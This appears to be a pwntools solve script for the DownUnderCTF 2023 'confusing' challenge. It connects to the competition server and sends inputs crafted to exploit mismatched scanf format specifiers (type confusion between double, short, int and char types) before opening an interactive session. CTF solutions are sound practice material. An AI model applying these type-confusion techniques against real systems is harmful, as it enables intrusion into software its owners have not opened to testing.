#asodjasdhas
from pwn import *

# p = process("./confusing")
# gdb.attach(p)

p = remote("2023.ductf.dev", 30024)

d = b"10200547327.9004377"

p.recvuntil(b"Give me d: ") # scanf("%lf", &d); // short d; d == 13337
p.sendline(d)

s = b"1195461702" # FLAG in ascii converted to decimal - funker

p.recvuntil(b"Give me s: ") # scanf("%d", &s); // char s[4]; strncmp(s, "FLAG", 4)
p.sendline(s)

f = p64(0x3FF9E3779B9486E5)

p.recvuntil(b"Give me f: ") # scanf("%8s", &f); // double f; f == 1.6180339887
p.sendline(f)

p.interactive()